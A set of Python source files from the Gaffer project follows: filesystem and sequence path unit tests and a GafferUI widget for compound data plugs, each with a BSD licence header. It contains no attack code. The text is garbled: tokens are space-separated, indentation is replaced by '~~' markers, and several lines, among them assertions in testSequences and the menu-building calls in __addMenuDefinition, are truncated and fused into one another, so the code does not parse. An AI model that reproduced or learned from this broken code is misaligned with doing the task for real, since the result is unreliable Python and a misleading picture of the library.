self . assertNotEqual ( aInfo [ "fileSystem:size" ] , l . info ( ) [ "fileSystem:size" ] ) \n 
\n 
~~ def testCopy ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) ) \n 
p2 = p . copy ( ) \n 
\n 
self . assertEqual ( p , p2 ) \n 
self . assertEqual ( str ( p ) , str ( p2 ) ) \n 
\n 
~~ def testEmptyPath ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( ) \n 
self . assertEqual ( str ( p ) , "" ) \n 
self . assertTrue ( p . isEmpty ( ) ) \n 
self . assertFalse ( p . isValid ( ) ) \n 
\n 
~~ def testRelativePath ( self ) : \n 
\n 
~~~ os . chdir ( self . temporaryDirectory ( ) ) \n 
\n 
with open ( self . temporaryDirectory ( ) + "/a" , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ p = Gaffer . FileSystemPath ( "a" ) \n 
\n 
self . assertEqual ( str ( p ) , "a" ) \n 
self . assertFalse ( p . isEmpty ( ) ) \n 
self . assertTrue ( p . isValid ( ) ) \n 
\n 
p2 = Gaffer . FileSystemPath ( "nonexistent" ) \n 
\n 
self . assertEqual ( str ( p2 ) , "nonexistent" ) \n 
self . assertFalse ( p2 . isEmpty ( ) ) \n 
self . assertFalse ( p2 . isValid ( ) ) \n 
\n 
~~ def testRelativePathChildren ( self ) : \n 
\n 
~~~ os . chdir ( self . temporaryDirectory ( ) ) \n 
os . mkdir ( "dir" ) \n 
with open ( self . temporaryDirectory ( ) + "/dir/a" , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ p = Gaffer . FileSystemPath ( "dir" ) \n 
\n 
c = p . children ( ) \n 
self . assertEqual ( len ( c ) , 1 ) \n 
self . assertEqual ( str ( c [ 0 ] ) , "dir/a" ) \n 
self . assertTrue ( c [ 0 ] . isValid ( ) ) \n 
\n 
~~ def testChildrenOfFile ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( __file__ ) \n 
self . assertEqual ( p . children ( ) , [ ] ) \n 
\n 
~~ def testModificationTimes ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) ) \n 
p . append ( "t" ) \n 
\n 
with open ( str ( p ) , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ mt = p . property ( "fileSystem:modificationTime" ) \n 
self . assertTrue ( isinstance ( mt , datetime . datetime ) ) \n 
self . assertLess ( ( datetime . datetime . utcnow ( ) - mt ) . total_seconds ( ) , 2 ) \n 
\n 
time . sleep ( 1 ) \n 
\n 
with open ( str ( p ) , "w" ) as f : \n 
~~~ f . write ( "BBBB" ) \n 
\n 
~~ mt = p . property ( "fileSystem:modificationTime" ) \n 
self . assertTrue ( isinstance ( mt , datetime . datetime ) ) \n 
self . assertLess ( ( datetime . datetime . utcnow ( ) - mt ) . total_seconds ( ) , 2 ) \n 
\n 
~~ def testOwner ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) ) \n 
p . append ( "t" ) \n 
\n 
with open ( str ( p ) , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ o = p . property ( "fileSystem:owner" ) \n 
self . assertTrue ( isinstance ( o , str ) ) \n 
self . assertEqual ( o , pwd . getpwuid ( os . stat ( str ( p ) ) . st_uid ) . pw_name ) \n 
\n 
~~ def testGroup ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) ) \n 
p . append ( "t" ) \n 
\n 
with open ( str ( p ) , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ g = p . property ( "fileSystem:group" ) \n 
self . assertTrue ( isinstance ( g , str ) ) \n 
self . assertEqual ( g , grp . getgrgid ( os . stat ( str ( p ) ) . st_gid ) . gr_name ) \n 
\n 
~~ def testPropertyNames ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) ) \n 
\n 
a = p . propertyNames ( ) \n 
self . assertTrue ( isinstance ( a , list ) ) \n 
\n 
self . assertTrue ( "fileSystem:group" in a ) \n 
self . assertTrue ( "fileSystem:owner" in a ) \n 
self . assertTrue ( "fileSystem:modificationTime" in a ) \n 
self . assertTrue ( "fileSystem:size" in a ) \n 
\n 
self . assertTrue ( "fileSystem:frameRange" not in a ) \n 
p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) , includeSequences = True ) \n 
self . assertTrue ( "fileSystem:frameRange" in p . propertyNames ( ) ) \n 
\n 
~~ def testSequences ( self ) : \n 
\n 
~~~ os . mkdir ( self . temporaryDirectory ( ) + "/dir" ) \n 
for n in [ "singleFile.txt" , "a.001.txt" , "a.002.txt" , "a.004.txt" , "b.003.txt" ] : \n 
~~~ with open ( self . temporaryDirectory ( ) + "/" + n , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ ~~ p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) , includeSequences = True ) \n 
self . assertTrue ( p . getIncludeSequences ( ) ) \n 
\n 
c = p . children ( ) \n 
self . assertEqual ( len ( c ) , 8 ) \n 
\n 
s = sorted ( c , key = str ) \n 
self . assertEqual ( str ( s [ 0 ] ) , self . temporaryDirectory ( ) + "/a.###.txt" ) \n 
self . assertEqual ( str ( s [ 1 ] ) , self . temporaryDirectory ( ) + "/a.001.txt" ) \n 
self . assertEqual ( str ( s [ 2 ] ) , self . temporaryDirectory ( ) + "/a.002.txt" ) \n 
self . assertEqual ( str ( s [ 3 ] ) , self . temporaryDirectory ( ) + "/a.004.txt" ) \n 
self . assertEqual ( str ( s [ 4 ] ) , self . temporaryDirectory ( ) + "/b.###.txt" ) \n 
self . assertEqual ( str ( s [ 5 ] ) , self . temporaryDirectory ( ) + "/b.003.txt" ) \n 
self . assertEqual ( str ( s [ 6 ] ) , self . temporaryDirectory ( ) + "/dir" ) \n 
self . assertEqual ( str ( s [ 7 ] ) , self . temporaryDirectory ( ) + "/singleFile.txt" ) \n 
\n 
for x in s : \n 
\n 
~~~ self . assertTrue ( x . isValid ( ) ) \n 
if not os . path . isdir ( str ( x ) ) : \n 
~~~ self . assertTrue ( x . isLeaf ( ) ) \n 
\n 
~~ self . assertEqual ( x . property ( "fileSystem:owner" ) , pwd . getpwuid ( os . stat ( str ( p ) ) . st_uid ) . pw_name self . assertEqual ( x . property ( "fileSystem:group" ) , grp . getgrgid ( os . stat ( str ( p ) ) . st_gid ) . gr_name self . assertLess ( ( datetime . datetime . utcnow ( ) - x . property ( "fileSystem:modificationTime" ) ) . total_seconds if "###" not in str ( x ) : \n 
~~~ self . assertFalse ( x . isFileSequence ( ) ) \n 
self . assertEqual ( x . fileSequence ( ) , None ) \n 
self . assertEqual ( x . property ( "fileSystem:frameRange" ) , "" ) \n 
if os . path . isdir ( str ( x ) ) : \n 
~~~ self . assertEqual ( x . property ( "fileSystem:size" ) , 0 ) \n 
~~ else : \n 
~~~ self . assertEqual ( x . property ( "fileSystem:size" ) , 4 ) \n 
\n 
~~ ~~ ~~ self . assertEqual ( s [ 0 ] . property ( "fileSystem:frameRange" ) , "1-2,4" ) \n 
self . assertTrue ( s [ 0 ] . isFileSequence ( ) ) \n 
self . assertTrue ( isinstance ( s [ 0 ] . fileSequence ( ) , IECore . FileSequence ) ) \n 
self . assertEqual ( s [ 0 ] . fileSequence ( ) , IECore . FileSequence ( str ( s [ 0 ] ) , IECore . frameListFromList ( [ self . assertEqual ( s [ 0 ] . property ( "fileSystem:size" ) , 4 * 3 ) \n 
\n 
self . assertEqual ( s [ 4 ] . property ( "fileSystem:frameRange" ) , "3" ) \n 
self . assertTrue ( s [ 4 ] . isFileSequence ( ) ) \n 
self . assertTrue ( isinstance ( s [ 4 ] . fileSequence ( ) , IECore . FileSequence ) ) \n 
self . assertEqual ( s [ 4 ] . fileSequence ( ) , IECore . FileSequence ( str ( s [ 4 ] ) , IECore . frameListFromList ( [ self . assertEqual ( s [ 4 ] . property ( "fileSystem:size" ) , 4 ) \n 
\n 
# make sure we can copy \n 
p2 = p . copy ( ) \n 
self . assertTrue ( p2 . getIncludeSequences ( ) ) \n 
self . assertEqual ( len ( p2 . children ( ) ) , 8 ) \n 
\n 
# make sure we can still exclude the sequences \n 
p = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) , includeSequences = False ) \n 
self . assertFalse ( p . getIncludeSequences ( ) ) \n 
\n 
c = p . children ( ) \n 
self . assertEqual ( len ( c ) , 6 ) \n 
\n 
s = sorted ( c , key = str ) \n 
self . assertEqual ( str ( s [ 0 ] ) , self . temporaryDirectory ( ) + "/a.001.txt" ) \n 
self . assertEqual ( str ( s [ 1 ] ) , self . temporaryDirectory ( ) + "/a.002.txt" ) \n 
self . assertEqual ( str ( s [ 2 ] ) , self . temporaryDirectory ( ) + "/a.004.txt" ) \n 
self . assertEqual ( str ( s [ 3 ] ) , self . temporaryDirectory ( ) + "/b.003.txt" ) \n 
self . assertEqual ( str ( s [ 4 ] ) , self . temporaryDirectory ( ) + "/dir" ) \n 
self . assertEqual ( str ( s [ 5 ] ) , self . temporaryDirectory ( ) + "/singleFile.txt" ) \n 
\n 
# and we can include them again \n 
p . setIncludeSequences ( True ) \n 
self . assertTrue ( p . getIncludeSequences ( ) ) \n 
\n 
c = p . children ( ) \n 
self . assertEqual ( len ( c ) , 8 ) \n 
\n 
~~ def setUp ( self ) : \n 
\n 
~~~ GafferTest . TestCase . setUp ( self ) \n 
\n 
self . __originalCWD = os . getcwd ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
\n 
~~~ GafferTest . TestCase . tearDown ( self ) \n 
\n 
os . chdir ( self . __originalCWD ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012-2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import unittest \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferTest \n 
\n 
class SequencePathTest ( GafferTest . TestCase ) : \n 
\n 
~~~ def __dictPath ( self ) : \n 
\n 
~~~ dict = { } \n 
dict [ "dir" ] = { } \n 
for f in IECore . FileSequence ( "a.#.exr 1-10" ) . fileNames ( ) : \n 
~~~ dict [ "dir" ] [ f ] = 1 \n 
~~ for f in IECore . FileSequence ( "b.####.tiff 20-200x2" ) . fileNames ( ) : \n 
~~~ dict [ "dir" ] [ f ] = 1 \n 
\n 
~~ return Gaffer . DictPath ( dict , "/" ) \n 
\n 
~~ def test ( self ) : \n 
\n 
~~~ path = Gaffer . SequencePath ( self . __dictPath ( ) ) \n 
\n 
self . failUnless ( path . isValid ( ) ) \n 
self . failUnless ( not path . isLeaf ( ) ) \n 
\n 
path . append ( "dir" ) \n 
self . failUnless ( path . isValid ( ) ) \n 
self . failUnless ( not path . isLeaf ( ) ) \n 
\n 
path [ 0 ] = "oops!" \n 
self . failIf ( path . isValid ( ) ) \n 
self . failIf ( path . isLeaf ( ) ) \n 
\n 
path [ : ] = [ "dir" ] \n 
children = path . children ( ) \n 
for child in children : \n 
~~~ self . failUnless ( isinstance ( child , Gaffer . SequencePath ) ) \n 
\n 
~~ self . assertEqual ( len ( children ) , 2 ) \n 
childrenStrings = [ str ( c ) for c in children ] \n 
self . failUnless ( "/dir/a.#.exr 1-10" in childrenStrings ) \n 
self . failUnless ( "/dir/b.####.tiff 20-200x2" in childrenStrings ) \n 
\n 
~~ def testNonLeafChildren ( self ) : \n 
\n 
~~~ path = Gaffer . SequencePath ( self . __dictPath ( ) ) \n 
children = path . children ( ) \n 
for child in children : \n 
~~~ self . failUnless ( isinstance ( child , Gaffer . SequencePath ) ) \n 
~~ self . assertEqual ( len ( children ) , 1 ) \n 
self . assertEqual ( str ( children [ 0 ] ) , "/dir" ) \n 
\n 
~~ def testCopy ( self ) : \n 
\n 
~~~ path = Gaffer . SequencePath ( self . __dictPath ( ) ) \n 
path . append ( "dir" ) \n 
\n 
path2 = path . copy ( ) \n 
self . failUnless ( isinstance ( path2 , Gaffer . SequencePath ) ) \n 
\n 
self . assertEqual ( path [ : ] , path2 [ : ] ) \n 
self . failUnless ( path . getFilter ( ) is path2 . getFilter ( ) ) \n 
\n 
c = [ str ( p ) for p in path . children ( ) ] \n 
c2 = [ str ( p ) for p in path2 . children ( ) ] \n 
\n 
self . assertEqual ( c , c2 ) \n 
\n 
~~ def testInfo ( self ) : \n 
\n 
~~~ dictPath = self . __dictPath ( ) \n 
path = Gaffer . SequencePath ( dictPath ) \n 
\n 
self . assertEqual ( dictPath . info ( ) , path . info ( ) ) \n 
\n 
~~ def testInfoOfInvalidPath ( self ) : \n 
\n 
~~~ fp = Gaffer . FileSystemPath ( "/iSurelyDontExist" ) \n 
self . assertEqual ( fp . isValid ( ) , False ) \n 
self . assertEqual ( fp . info ( ) , None ) \n 
\n 
sp = Gaffer . SequencePath ( fp ) \n 
self . assertEqual ( sp . isValid ( ) , False ) \n 
self . assertEqual ( sp . info ( ) , None ) \n 
\n 
~~ def testFilter ( self ) : \n 
\n 
~~~ dictPath = self . __dictPath ( ) \n 
path = Gaffer . SequencePath ( dictPath ) \n 
\n 
~~ def testIsEmpty ( self ) : \n 
\n 
~~~ dictPath = self . __dictPath ( ) \n 
path = Gaffer . SequencePath ( dictPath ) \n 
\n 
path . setFromString ( "" ) \n 
self . assertTrue ( path . isEmpty ( ) ) \n 
\n 
path2 = path . copy ( ) \n 
self . assertTrue ( path2 . isEmpty ( ) ) \n 
\n 
~~ def testProperties ( self ) : \n 
\n 
~~~ dictPath = self . __dictPath ( ) \n 
path = Gaffer . SequencePath ( dictPath ) \n 
\n 
self . assertEqual ( dictPath . propertyNames ( ) , path . propertyNames ( ) ) \n 
self . assertEqual ( dictPath . property ( "dict:value" ) , path . property ( "dict:value" ) ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
# This script is used by PythonApplicationTest.py \n 
\n 
~~ assert ( __name__ == "__main__" ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, John Haddon. All rights reserved. \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
from __future__ import with_statement \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferUI \n 
\n 
## Supported plug metadata : \n 
# \n 
# "compoundDataPlugValueWidget:editable" \n 
class CompoundDataPlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , parenting = None ) : \n 
\n 
~~~ self . __column = GafferUI . ListContainer ( spacing = 6 ) \n 
\n 
GafferUI . PlugValueWidget . __init__ ( self , self . __column , plug , parenting = parenting ) \n 
\n 
with self . __column : \n 
\n 
~~~ self . __layout = GafferUI . PlugLayout ( plug ) \n 
\n 
with GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Horizontal ) as self . __editRow : \n 
\n 
~~~ GafferUI . Spacer ( IECore . V2i ( GafferUI . PlugWidget . labelWidth ( ) , 1 ) ) \n 
\n 
GafferUI . MenuButton ( \n 
image = "plus.png" , \n 
hasFrame = False , \n 
menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __addMenuDefinition ) ) \n 
) \n 
\n 
GafferUI . Spacer ( IECore . V2i ( 1 ) , IECore . V2i ( 999999 , 1 ) , parenting = { "expand" : True } ) \n 
\n 
~~ ~~ self . _updateFromPlug ( ) \n 
\n 
~~ def hasLabel ( self ) : \n 
\n 
~~~ return True \n 
\n 
~~ def setPlug ( self , plug ) : \n 
\n 
~~~ GafferUI . PlugValueWidget . setPlug ( self , plug ) \n 
\n 
self . __layout = GafferUI . PlugLayout ( plug ) \n 
self . __column [ 0 ] = self . __layout \n 
\n 
~~ def setReadOnly ( self , readOnly ) : \n 
\n 
~~~ if readOnly == self . getReadOnly ( ) : \n 
~~~ return \n 
\n 
~~ GafferUI . PlugValueWidget . setReadOnly ( self , readOnly ) \n 
\n 
self . __layout . setReadOnly ( readOnly ) \n 
\n 
~~ def childPlugValueWidget ( self , childPlug , lazy = True ) : \n 
\n 
~~~ return self . __layout . plugValueWidget ( childPlug , lazy ) \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ editable = True \n 
if self . getPlug ( ) is not None : \n 
~~~ editable = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "compoundDataPlugValueWidget:editable" ) \n 
editable = editable if editable is not None else True \n 
\n 
~~ self . __editRow . setVisible ( editable ) \n 
\n 
~~ def __addMenuDefinition ( self ) : \n 
\n 
~~~ result = IECore . MenuDefinition ( ) \n 
result . append ( "/Add/Bool" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , IECore result . append ( "/Add/Float" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , result . append ( "/Add/Int" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , IECore result . append ( "/Add/NumericDivider" , { "divider" : True } ) \n 
\n 
result . append ( "/Add/String" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , result . append ( "/Add/StringDivider" , { "divider" : True } ) \n 
\n 
result . append ( "/Add/V2i" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , IECore result . append ( "/Add/V3i" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , IECore result . append ( "/Add/V2f" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , IECore result . append ( "/Add/V3f" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" , IECore result . append ( "/Add/VectorDivider" , { "divider" : True } ) \n 
\n 
result . append ( "/Add/Color3f" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" result . append ( "/Add/Color4f" , { "command" : IECore . curry ( Gaffer . WeakMethod ( self . __addItem ) , "" \n 
return result \n 
\n 
~~ def __addItem ( self , name , value ) : \n 
\n 
~~~ with Gaffer . UndoContext ( self . getPlug ( ) . ancestor ( Gaffer . ScriptNode . staticTypeId ( ) ) ) : \n 
~~~ self . getPlug ( ) . addOptionalMember ( name , value , enabled = True ) \n 
\n 
~~ ~~ ~~ class _MemberPlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , childPlug ) : \n 
\n 
~~~ self . __row = GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Horizontal , spacing = 4 ) \n 
\n 
GafferUI . PlugValueWidget . __init__ ( self , self . __row , childPlug ) \n 
\n 
if not childPlug . getFlags ( Gaffer . Plug . Flags . Dynamic ) : \n 
~~~ nameWidget = GafferUI . LabelPlugValueWidget ( \n 
childPlug , \n 
horizontalAlignment = GafferUI . Label . HorizontalAlignment . Right , \n 
verticalAlignment = GafferUI . Label . VerticalAlignment . Center , \n 
) \n 
nameWidget . label ( ) . _qtWidget ( ) . setFixedWidth ( GafferUI . PlugWidget . labelWidth ( ) ) \n 
# cheat to get the height of the label to match the height of a line edit \n 
\n 
# sorted for the QLabel so that that happened naturally, but QLabel sizing appears \n 
# somewhat unpredictable (and is sensitive to HTML in the text as well), making this \n 
# a tricky task. \n 
nameWidget . label ( ) . _qtWidget ( ) . setFixedHeight ( 20 ) \n 
~~ else : \n 
~~~ nameWidget = GafferUI . StringPlugValueWidget ( childPlug [ "name" ] ) \n 
nameWidget . textWidget ( ) . _qtWidget ( ) . setFixedWidth ( GafferUI . PlugWidget . labelWidth ( ) ) \n 
\n 
~~ self . __row . append ( nameWidget , \n 
verticalAlignment = GafferUI . Label . VerticalAlignment . Top \n 
) \n 
\n 
if "enabled" in childPlug : \n 
~~~ self . __row . append ( \n 
GafferUI . BoolPlugValueWidget ( \n 
childPlug [ "enabled" ] , \n 
displayMode = GafferUI . BoolWidget . DisplayMode . Switch \n 
) , \n 
verticalAlignment = GafferUI . Label . VerticalAlignment . Top , \n 
) \n 
\n 
~~ self . __row . append ( GafferUI . PlugValueWidget . create ( childPlug [ "value" ] ) , expand = True ) \n 
\n 
self . _updateFromPlug ( ) \n 
\n 
~~ def setPlug ( self , plug ) : \n 
\n 
~~~ GafferUI . PlugValueWidget . setPlug ( self , plug ) \n 
\n 
if isinstance ( self . __row [ 0 ] , GafferUI . LabelPlugValueWidget ) : \n 
~~~ self . __row [ 0 ] . setPlug ( plug ) \n 
~~ else : \n 
~~~ self . __row [ 0 ] . setPlug ( plug [ "name" ] ) \n 
\n 
~~ if "enabled" in plug : \n 
~~~ self . __row [ 1 ] . setPlug ( plug [ "enabled" ] ) \n 
\n 
~~ self . __row [ - 1 ] . setPlug ( plug [ "value" ] ) \n 
\n 
~~ def hasLabel ( self ) : \n 
\n 
~~~ return True \n 
\n 
~~ def childPlugValueWidget ( self , childPlug , lazy = True ) : \n 
\n 
~~~ for w in self . __row : \n 
~~~ if w . getPlug ( ) . isSame ( childPlug ) : \n 
~~~ return w \n 
\n 
~~ ~~ return None \n 
\n 
~~ def setReadOnly ( self , readOnly ) : \n 
\n 
~~~ if readOnly == self . getReadOnly ( ) : \n 
~~~ return \n 
\n 
~~ GafferUI . PlugValueWidget . setReadOnly ( self , readOnly ) \n 
\n 
for w in self . __row : \n 
~~~ w . setReadOnly ( readOnly ) \n 
\n 
~~ ~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ if "enabled" in self . getPlug ( ) : \n 
~~~ with self . getContext ( ) : \n 
~~~ enabled = self . getPlug ( ) [ "enabled" ] . getValue ( ) \n 
\n 
~~ if isinstance ( self . __row [ 0 ] , GafferUI . StringPlugValueWidget ) : \n 
~~~ self . __row [ 0 ] . setEnabled ( enabled ) \n 
\n 
~~ self . __row [ - 1 ] . setEnabled ( enabled ) \n 
\n 
~~ ~~ ~~ GafferUI . PlugValueWidget . registerType ( Gaffer . CompoundDataPlug , CompoundDataPlugValueWidget ) \n 
GafferUI . PlugValueWidget . registerType ( Gaffer . CompoundDataPlug . MemberPlug , _MemberPlugValueWidget ) \n 
\n 
########################################################################## \n 
# Plug menu \n 
########################################################################## \n 
\n 
def __deletePlug ( plug ) : \n 
\n 
~~~ with Gaffer . UndoContext ( plug . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ plug . parent ( ) . removeChild ( plug ) \n 
\n 
~~ ~~ def __plugPopupMenu ( menuDefinition , plugValueWidget ) : \n 
\n 
~~~ plug = plugValueWidget . getPlug ( ) \n 
memberPlug = plug if isinstance ( plug , Gaffer . CompoundDataPlug . MemberPlug ) else None \n 
memberPlug = memberPlug if memberPlug is not None else plug . ancestor ( Gaffer . CompoundDataPlug . MemberPlug if memberPlug is None : \n 
~~~ return \n 
\n 
~~ if not memberPlug . getFlags ( Gaffer . Plug . Flags . Dynamic ) : \n 
~~~ return \n 
\n 
~~ menuDefinition . append ( "/DeleteDivider" , { "divider" : True } ) \n 
menuDefinition . append ( "/Delete" , { "command" : IECore . curry ( __deletePlug , memberPlug ) , "active" \n 
~~ __plugPopupMenuConnection = GafferUI . PlugValueWidget . popupMenuSignal ( ) . connect ( __plugPopupMenu ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
